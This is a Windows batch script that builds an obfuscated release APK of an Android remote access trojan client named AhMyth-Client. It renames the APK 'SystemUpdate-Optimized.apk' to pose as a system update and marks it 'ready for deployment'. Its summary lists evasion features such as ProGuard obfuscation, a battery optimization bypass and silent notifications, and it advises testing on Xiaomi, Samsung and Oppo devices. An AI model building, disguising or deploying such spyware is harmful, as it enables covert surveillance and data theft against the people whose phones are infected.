@echo off
echo ========================================
echo   Building Optimized Android RAT APK
echo ========================================
echo.

cd /d "%~dp0AhMyth-Client"

echo [1/4] Cleaning previous builds...
call gradlew clean

echo.
echo [2/4] Building Release APK with ProGuard obfuscation...
call gradlew assembleRelease

echo.
echo [3/4] Checking build status...
if exist "app\build\outputs\apk\release\app-release.apk" (
    echo.
    echo ========================================
    echo   BUILD SUCCESSFUL!
    echo ========================================
    echo.
    echo APK Location:
    echo %~dp0AhMyth-Client\app\build\outputs\apk\release\app-release.apk
    echo.
    echo Mapping File (for debugging):
    echo %~dp0AhMyth-Client\app\build\outputs\mapping\release\mapping.txt
    echo.
    
    echo [4/4] Copying APK to root directory...
    copy "app\build\outputs\apk\release\app-release.apk" "..\SystemUpdate-Optimized.apk"
    
    echo.
    echo ========================================
    echo   APK READY FOR DEPLOYMENT
    echo ========================================
    echo.
    echo File: SystemUpdate-Optimized.apk
    echo.
    echo Optimizations Applied:
    echo   [+] ProGuard Code Obfuscation
    echo   [+] Resource Shrinking
    echo   [+] Battery Optimization Bypass
    echo   [+] Reduced GPS/Location Usage
    echo   [+] Optimized Watchdog Interval
    echo   [+] Silent Notifications
    echo.
    
    for %%A in ("..\SystemUpdate-Optimized.apk") do (
        echo APK Size: %%~zA bytes
    )
    
    echo.
    echo IMPORTANT NOTES:
    echo   1. This APK is signed with the release key
    echo   2. ProGuard has obfuscated all code
    echo   3. Battery optimization bypass will prompt user
    echo   4. Test on real devices (Xiaomi, Samsung, Oppo)
    echo.
    
) else (
    echo.
    echo ========================================
    echo   BUILD FAILED!
    echo ========================================
    echo.
    echo Please check the error messages above.
    echo Common issues:
    echo   - Java/Android SDK not configured
    echo   - Gradle version mismatch
    echo   - Missing dependencies
    echo.
)

echo.
pause
